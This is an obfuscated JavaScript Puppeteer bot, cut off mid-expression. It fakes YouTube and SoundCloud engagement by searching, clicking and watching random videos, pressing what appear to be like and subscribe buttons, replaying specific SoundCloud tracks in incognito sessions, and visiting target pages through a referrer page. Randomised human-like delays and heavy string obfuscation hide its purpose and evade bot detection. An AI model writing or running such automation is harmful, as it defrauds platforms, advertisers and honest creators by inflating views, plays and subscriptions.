const X = d,
  W = b,
  V = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x1 * -0x432 + -0x2 * 0x19d + -0xf7))) + i;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x7 * 0x36d + -0x40 * 0x2a + -0x11 * 0xcb);
    let h = e[f];
    if (c['QBYZYW'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x4 * -0x3e4 + 0x50 * 0x4e + -0x8d0, r, s, t = -0xe52 + -0x1 * 0x1934 + -0x1 * -0x2786; s = m['charAt'](t++); ~s && (r = q % (0x90e + -0x1 * 0x911 + 0x7 * 0x1) ? r * (-0x1505 * 0x1 + 0x25b3 + -0x3 * 0x57a) + s : s, q++ % (-0xff0 + 0x2149 * 0x1 + -0x1155)) ? o += String['fromCharCode'](0x18f + 0x56b + -0x5fb * 0x1 & r >> (-(-0x1 * -0x1039 + 0x557 + -0x158e) * q & -0x1ee * -0x3 + 0x7 * 0x5d + -0x2c5 * 0x3)) : 0x3 * 0x595 + -0x1 * 0x17d7 + 0x718 * 0x1) {
          s = n['indexOf'](s);
        }
        for (let u = -0x5e0 * 0x2 + 0x891 + 0x32f * 0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x2710 + 0x2 * 0xdbd + -0x86 * 0x7f))['slice'](-(-0x1899 * -0x1 + 0x1b85 * -0x1 + 0x2ee));
        }
        return decodeURIComponent(p);
      };
      c['dTLOZp'] = i, b = arguments, c['QBYZYW'] = !![];
    }
    const j = e[0x1 * 0x1c28 + -0x11f7 + -0xa31],
      k = f + j,
      l = b[k];
    return !l ? (h = c['dTLOZp'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x916 * 0x4 + -0x695 + 0x1 * -0x1dc3), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x1d * 0x4a7 + -0x3dcf + -0x139ea * -0x1 + (0x1fed + 0x5 * 0x1053 + -0x36f4) * random()) : await standardWaitForNetIdle(f), await wait(-0x2628 + 0x1 * 0x16bd + -0x17 * -0x185 + (0x1 * -0x4a39 + -0x952 * 0x2 + 0x1 * 0x83ed) * random()), -0x233 * -0x8 + 0xb * -0x1fc + -0x5 * -0xd9;
}
async function standardWaitForNetIdle(f) {
  return await wait(0x556 + 0x1 * 0x2521 + -0x16ef), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x2a3 * -0x1 + -0x5 * -0x602 + 0x7 * -0x3ea;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x7 * 0x36d + -0x40 * 0x2a + -0x11 * 0xcb);
    let h = e[f];
    if (b['Ougwar'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x4 * -0x3e4 + 0x50 * 0x4e + -0x8d0, s, t, u = -0xe52 + -0x1 * 0x1934 + -0x1 * -0x2786; t = n['charAt'](u++); ~t && (s = r % (0x90e + -0x1 * 0x911 + 0x7 * 0x1) ? s * (-0x1505 * 0x1 + 0x25b3 + -0x3 * 0x57a) + t : t, r++ % (-0xff0 + 0x2149 * 0x1 + -0x1155)) ? p += String['fromCharCode'](0x18f + 0x56b + -0x5fb * 0x1 & s >> (-(-0x1 * -0x1039 + 0x557 + -0x158e) * r & -0x1ee * -0x3 + 0x7 * 0x5d + -0x2c5 * 0x3)) : 0x3 * 0x595 + -0x1 * 0x17d7 + 0x718 * 0x1) {
          t = o['indexOf'](t);
        }
        for (let v = -0x5e0 * 0x2 + 0x891 + 0x32f * 0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x2710 + 0x2 * 0xdbd + -0x86 * 0x7f))['slice'](-(-0x1899 * -0x1 + 0x1b85 * -0x1 + 0x2ee));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1 * 0x1c28 + -0x11f7 + -0xa31,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x199c + 0x523 * -0x2 + 0x23e2; u < 0x2c4 + -0x1215 + 0x1 * 0x1051; u++) {
          p[u] = u;
        }
        for (u = -0x740 + 0x11cd + -0xa8d * 0x1; u < 0x21ac + -0x8 * -0x214 + -0x314c; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x1b7 * 0x4 + -0x2666 + 0x17e * 0x1f), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x407 + -0x2e * -0x3 + 0x13 * 0x2f, q = 0x19f1 + 0x2443 * 0x1 + 0x6 * -0xa5e;
        for (let v = 0x1 * 0x1e58 + -0x114c + -0xa * 0x14e; v < n['length']; v++) {
          u = (u + (0x7 * 0x2b4 + -0x22f2 + 0x1007)) % (0x1 * -0xf29 + 0x2 * 0x964 + -0x3d * 0xb), q = (q + p[u]) % (0xab7 + -0x25ee + -0xe9 * -0x1f), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x2072 + 0x2151 + 0x1 * -0x40c3)]);
        }
        return t;
      };
      b['aHnXfP'] = m, c = arguments, b['Ougwar'] = !![];
    }
    const j = e[0xe69 + -0x9 * 0x107 + -0x52a],
      k = f + j,
      l = c[k];
    return !l ? (b['aMhsnq'] === undefined && (b['aMhsnq'] = !![]), h = b['aHnXfP'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function randomWait() {
  return await wait(-0x1d6 * -0x13 + -0x613 * 0x4 + 0x8f2 * 0x1 + (-0xfaf + 0x1 * 0x1c28 + 0x70f) * random()), -0xadb + -0x199c + 0x91e * 0x4;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x45d + 0x2c4 + 0x199, 0xb22 + -0x1 * -0x29 + -0xb44), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x3 * 0x5281 + -0x1cd6a + -0x9 * -0x31cf) * getRandomInt(-0x1dff + -0x1b7 * 0x4 + 0x24dd, 0x1df8 + -0x19cf * -0x1 + -0x319 * 0x12), h)), 0x1208 * 0x1 + 0xa5d + 0x719 * -0x4;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1e * -0xc7 + 0x2 * 0x732 + -0x25b6;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x20fc * -0x1 + 0x3 * -0x4a2 + -0x1315]['split']('\x20');
    for (let k = 0x1cb * -0x3 + 0xf29 * -0x1 + 0x1 * 0x148a; k < i['length']; k += -0x1580 + 0xab7 + 0xacb)
      j += i[k] * h[i[k + (0x211d * 0x1 + -0x1c72 + -0x4aa)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1 * -0x152e + 0x1d4 + -0x4 * 0x5bf)['map'](l => Array['from'](l['children']))['flat'](-0x1 * 0x1267 + -0x2545 + 0x37ad)['map'](l => l['childNodes'][0x253b + -0x1bfb + -0x93f]['childNodes'][0x1ba6 * 0x1 + -0xa1 * -0x2f + -0x3935]['childNodes'][0x2669 * 0x1 + 0x1 * -0xad4 + -0x1b94]['childNodes'][-0xe * -0x95 + 0xf5a + -0x4 * 0x5e0]['childNodes'][-0x2044 + 0x553 * -0x7 + 0x458a]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x1e84 + 0x2ad * -0x1 + -0x1 * 0x17ef, -0x2305 + 0xd6 * -0x9 + 0x3e13)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x676f * 0x1 + -0x1704 * -0x5 + -0x9feb);
  const h = await getMaxTime(f),
    i = Math['min']((-0x399e + 0xa80d + 0x7bf1) * getRandomInt(0x159 + -0x1ab8 + 0x1961, -0x22c0 * -0x1 + 0x77c + -0x6b * 0x65), h);
  return await wait(i), -0x1021 * 0x2 + 0x9d7 * -0x1 + 0x2a1a;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0xe3b + -0x40f + -0xa2c]['children'][0xf * 0x1bb + -0xfbf + 0xa36 * -0x1]['children'][0x2521 + -0x1a16 + -0xb * 0x101]['children'][0x24c5 * 0x1 + -0x3 * -0xb35 + 0x154 * -0x35]['children'][-0x1fb4 + 0xdab + 0x1209]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x172f * -0x1 + -0x6f * 0x2a + 0x35 * -0x18;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0xc95 * 0x1 + -0x105d + 0x1d56 + (-0xa93 + -0xb * 0x31a + -0x1 * -0x2ce3) * random()
  }), await wait(-0x964 + -0x1 * 0x347 + 0xe9f + (0x5d0 + 0x20cf + -0x2573 * 0x1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const R = c,
      k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x212 * -0x1 + 0x3cc + -0x1b8]['childNodes'][0x2 * -0x665 + 0x1b8e + 0x1 * -0xec3]['childNodes'][-0x5ca + 0x2621 + -0x2056]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l[R(0x0)][0x1e51 + 0x2 * -0xcc + 0x29c * -0xb]['childNodes'][0x114e + -0x33b * -0x6 + -0x24b0]['childNodes'][-0x2c0 + 0xe2 * 0x2b + -0x8cd * 0x4]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0xa60 + -0x657 * -0x1 + 0x2f * 0x16),
          r = 0x119 * 0x4 + -0x25f5 + 0x2191;
        for (let u = -0x54c + -0x19 * -0xb + -0x2f * -0x17; u < q['length']; u += -0x22ad + 0x22b + 0x2084)
          r += q[u] * k[q[u + (0x125d + -0x24dc + 0x1280 * 0x1)]];
        return r;
      }(n);
  });
  await wait((0x4ca + 0x2829 + 0xda5) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0xeac0 + 0x15c29 * -0x1 + 0x15bc9) * getRandomInt(-0x983 * 0x4 + 0x1131 * -0x1 + 0x373e, 0x1 * 0x1edb + 0x5d4 * -0x4 + -0x781), h + (-0x1fcb + -0x1fb1 + 0x5304));
  return await wait(i), 0x2290 + -0x1 * 0x15dc + -0xcb3;
}
async function keyWatch(f) {
  const S = b;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x46 * -0x6a + 0x13a5 + -0x30a1), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + S(0x4, 'SF6N') + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x43f + -0x15f8 + 0x1d71 + (0x585 + 0x2594 + -0x2731) * Math['random']());
    });
  }, 0xd4 + 0x1d7e + -0x2fa);
  await wait(0x26968 + 0x5 * -0x12e72 + -0x1ba * -0x4ad);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x39b8 * 0x5 + 0x7c70 + -0xb2a8) * getRandomInt(0x1086 + 0x1e3f + -0x2ec1, 0x22e3 + 0x19 * 0x4f + -0x2a81)), clearInterval(h), 0x196e + 0x17a9 + 0xce * -0x3d;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x7 * 0x36d + -0x40 * 0x2a + -0x11 * 0xcb);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x123a + 0x2190 + -0x1 * 0x33ca;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0xba3 + 0x39 * 0x3 + 0xaf9;
    await randomWait();
  }
  return -0x255d * -0x1 + 0x1 * -0x1bf7 + -0x965;
}

function fetchRandomSC() {
  const T = d;
  return Math['random']() <= 0xd70 + 0xe * 0x21a + -0x2adc + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x1d23 + 0x2b * 0xad + -0x23d * 0x1a + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + T(0x17) + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x1132 + -0x15fd + -0x599 * -0x7 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0xad0 * -0x1 + -0xc76 + -0x1 * -0x1a6;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x2a26 + 0x1 * -0x7e82 + 0x10424 + getRandomInt(-0x9fd + -0x184 + -0x61 * -0xb9, 0x4b80 + -0x2f3 * -0x4a + -0xb08e));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x466 * 0x1 + -0x59 * -0xb + 0x1 * 0x94), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x14a6 + 0x3c7 + 0x269 * 0x7;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x2554 + 0xe9 * -0x1b + 0x3de7, -0x1ebe + 0x25bc + -0x6cc)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x7 * 0x45f + 0x852 + -0x1e17 * -0x1 + floor((0x1 * 0x22d2 + 0x2148 + -0x1 * 0x4032) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x6f5ac386 + 0xae06f9e6 + 0x4 * -0x27586f5b),
          -0xecb07f + -0x8bd290 + -0x4812b9 * -0x7,
          -0x679b + 0x50f * 0x27 + 0x2252 * 0x1,
          -0x55c * 0x7 + 0x2443 + 0x1c1 * 0x1
        ], y = [
          0x23d4 + 0xe81 + -0x323d,
          0x77c + 0x910 + -0x107c,
          -0x2679 + -0x185b + 0x3edc,
          -0x252f + 0x1cb5 * 0x1 + 0x87a
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0xbf * -0x24 + 0x14 * -0x115 + 0x3081)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x150f + 0xc22 + -0x2131; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x221a + -0x6b6 + -0x10 * -0x28d) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0xe0d + 0x23d1 + -0x1a * 0x1eb] = A[0x121c + -0x10ee * 0x1 + -0x11e] = A[-0xb * 0x78 + -0x1244 + 0x176d] = A[0x31e + -0x1e6c + 0x10 * 0x1b5] = A[0xa * -0xc5 + 0x2526 + -0x1d71] = A[0x3eb * 0x2 + 0x15b2 * 0x1 + 0x2 * -0xec2] = A[-0x1e2a + -0x1c94 + 0x3ac3] = A[-0x43 * 0x3d + 0x1af4 + -0xaf7] = A[0x1 * 0x119 + -0x2058 + 0x2 * 0xfa3] = A[0x1 * -0x1afb + -0x893 + 0x2396] = A[0xc0f + 0x1 * 0x1ef7 + -0x2afd] = A[0x1855 * 0x1 + -0x1b52 * -0x1 + -0x339d] = A[-0x21bd + 0x5a6 + 0x1 * 0x1c22] = A[0x1d11 + 0x1 * 0x248f + -0x4194] = A[-0x8b8 * -0x1 + 0x3 * 0x6c7 + 0x4 * -0x740] = A[-0x7 * 0x24b + -0x1c6 + 0xc7 * 0x17] = A[-0x88d + -0x2 * -0x6bf + -0x4e2] = -0x1abf + -0x7 * 0x49 + -0x1a * -0x11b, this['blocks'] = A) : this['blocks'] = [
                0x297 + -0xc9 * 0x1d + 0x171 * 0xe,
                0xeb9 + 0x26b * -0xe + -0x53 * -0x3b,
                0x1 * -0x17e3 + -0xb44 * 0x1 + 0x2327,
                0x1 * 0x6b0 + -0x17e3 + 0x103 * 0x11,
                -0x1ee5 + 0x21b9 + -0x2d4,
                0x3 * 0xb4e + 0x120 + 0xd * -0x2b2,
                0x21 * 0x9 + -0x3 * 0x5f + -0xc * 0x1,
                0x4ae + 0xd * -0x2f5 + 0xb41 * 0x3,
                -0x7 * -0x50e + -0x1 * 0x2187 + 0x5 * -0x5f,
                -0x4 * 0x982 + 0x61 * 0x22 + 0x4a * 0x57,
                0x25b3 + -0x1 * -0x7c9 + -0x1 * 0x2d7c,
                0x3 * -0x4cc + 0x1 * 0xc3a + -0x22a * -0x1,
                0x115b * 0x1 + -0x2 * -0x8c9 + -0x22ed,
                0x191 + -0xe * 0x252 + 0x1eeb,
                -0x1b * 0xcf + 0x7 * 0x547 + -0xf1c,
                0x2479 + -0x1 * -0x21f5 + -0x466e,
                -0xc57 + -0x1 * -0x2513 + 0x18bc * -0x1
              ], this['h0'] = 0x901a4a8 * 0x8 + -0x54767f0f * -0x1 + -0x353e814e, this['h1'] = -0x13a0d64ef + -0x1164cdcfc + -0x20018922 * -0x1a, this['h2'] = -0xbb * -0x1901453 + 0x2fa9 * -0x3894a + 0x1d063c37, this['h3'] = -0xc52f068 + 0x10256b8 + 0x1b82ee26, this['h4'] = 0x14f548 * 0x11a5 + 0x101b467a2 + -0x1afad651a, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x1582 * -0x1 + -0x12e3 + 0x47d * 0x9, this['finalized'] = this['hashed'] = 0x124a * -0x1 + -0x293 * -0x2 + 0xd24, this['first'] = -0x252c + -0x1 * 0x2bb + -0x4fd * -0x8;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x9 * -0xa7 + 0x11d + -0x6fc, O = J['length'] || 0x1 * 0x6f3 + -0x15b3 + 0xec0, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x8 * -0x2a1 + 0x1e18 + 0x122 * -0x8, P[-0x11 * -0x189 + 0xb * 0x32c + -0x3cfd] = this['block'], P[0xfb * 0x22 + 0x3 * 0x192 + -0x25fc] = P[-0x2068 + -0x172a + 0x1 * 0x3793] = P[-0x1f7d * 0x1 + -0x2 * -0x4fb + 0x1589] = P[-0x1aa * -0x4 + -0x1772 * 0x1 + 0x10cd] = P[-0x1895 + 0x1 * -0x10cb + -0x1 * -0x2964] = P[0x7 * -0x540 + 0xdad * -0x2 + 0x401f * 0x1] = P[-0x1 * 0x24e8 + 0xc5d + 0x13 * 0x14b] = P[0x2 * -0x155 + -0x20 * -0x83 + -0xdaf] = P[-0x23f9 + 0x1 * -0x20d1 + 0x44d2] = P[0x2477 + 0x28 * -0x3 + -0x23f6] = P[0x39 * -0x53 + 0x1abf + -0x1 * 0x83a] = P[-0x161f + -0x1d20 + -0x334a * -0x1] = P[-0x1 * 0x260f + -0x1 * -0x1bc5 + 0xbd * 0xe] = P[-0x189 * -0x17 + 0x1 * 0x2137 + 0x3 * -0x16d3] = P[-0xb73 * 0x3 + -0x1bc0 + 0x3e27] = P[0x1 * -0x1b6b + -0x1 * 0x1b6d + 0x36e7] = 0x533 + 0x6e6 + 0x1 * -0xc19), K) {
                    for (N = this['start']; M < O && N < 0x1 * 0x1 + -0x22df + 0x231e; ++M)
                      P[N >> -0x889 * 0x1 + 0xad * 0x2f + 0x8 * -0x2e7] |= J[M] << y[-0x10bc + 0x6ad + 0x509 * 0x2 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x172a + -0x1313 + 0x2a7d; ++M)
                      (L = J['charCodeAt'](M)) < -0x7 * -0x17b + 0x26ff + -0x30dc ? P[N >> -0x8 * 0x191 + -0x15 * 0x112 + 0x2304] |= L << y[-0x9b6 + -0x1bf4 + 0x25ad & N++] : L < 0x1140 + -0x1ddf + 0x149f ? (P[N >> -0x1975 + 0x2360 + -0x9e9] |= (0x15fa + 0x4 * -0x7fb + 0x2 * 0x559 | L >> -0xfc7 + 0xc19 + 0x3b4) << y[0xd4a + 0xb52 + 0x1 * -0x1899 & N++], P[N >> 0x2033 + -0x1 * -0x1e0c + -0x3e3d] |= (0x1808 + 0x17e1 + 0x35 * -0xe5 | -0x216f + 0xf1 * 0x5 + 0x1cf9 & L) << y[-0x9e7 * -0x2 + -0x1 * 0x14f9 + 0x12e & N++]) : L < 0x1128e + -0x8e94 + 0x5406 || L >= -0x51a9 + -0xc9b * 0xb + -0xde29 * -0x2 ? (P[N >> 0xfb2 + 0x110 * 0x1f + -0x185 * 0x20] |= (0x1 * 0xa49 + -0x1 * 0xc21 + -0x2b8 * -0x1 | L >> 0x1552 * 0x1 + 0x9fc + 0x2 * -0xfa1) << y[0x25e8 + -0x197 * -0x3 + 0x1 * -0x2aaa & N++], P[N >> 0x743 + 0x1d88 + -0x24c9] |= (0x782 + 0x1 * 0x2513 + -0x2c15 | L >> 0xdc + 0x1b62 + -0x1c38 & 0x24f1 + 0x1f68 + -0x441a) << y[-0x1958 + 0x1e86 * -0x1 + -0x5 * -0xb2d & N++], P[N >> -0xea4 * -0x2 + 0x6 * 0x10 + -0x1da6] |= (0x416 * 0x2 + 0x3 * 0x7b2 + -0x2 * 0xf61 | 0x1 * -0x21ff + -0x77 + 0x22b5 & L) << y[0x124 * -0x1 + -0x1 * -0x1c97 + -0x1 * 0x1b70 & N++]) : (L = 0x1f009 + -0x9827 + 0x1 * -0x57e2 + ((-0x9dd + 0x1605 + 0x1 * -0x829 & L) << 0x1977 * 0x1 + -0x2478 + 0xb0b | 0x1887 + -0x170b + 0x283 & J['charCodeAt'](++M)), P[N >> -0x186d + -0x245e + 0x3ccd] |= (0x1130 + 0x1 * 0x36 + 0xe * -0x12d | L >> 0x1 * 0x17 + 0x35 * -0x3a + 0x1 * 0xbfd) << y[-0x20c + 0x23b2 + -0x21a3 * 0x1 & N++], P[N >> -0x160b + -0x24c3 * -0x1 + -0xeb6] |= (-0xfc3 + 0x656 + 0x9ed | L >> -0x2 * -0xae2 + -0x1bc * -0xd + 0x1 * -0x2c44 & -0x24ab + -0x2 * -0x481 + 0x1be8) << y[0x1 * 0xfd3 + 0x144c + -0x241c & N++], P[N >> 0x2531 + 0x52 * 0x1b + -0x2dd5] |= (-0x11e1 + -0x1 * 0xc09 + 0x2 * 0xf35 | L >> -0x5 * -0x726 + 0x24ee * -0x1 + 0x136 & 0xb * -0x369 + 0xb89 + 0x1a39) << y[0x2363 + 0x7c * -0xe + 0x78 * -0x3d & N++], P[N >> 0xa12 * 0x3 + 0x15e + -0x1f92] |= (0x10f4 + -0x2 * -0xa69 + -0xd * 0x2de | 0x2db + 0x1 * 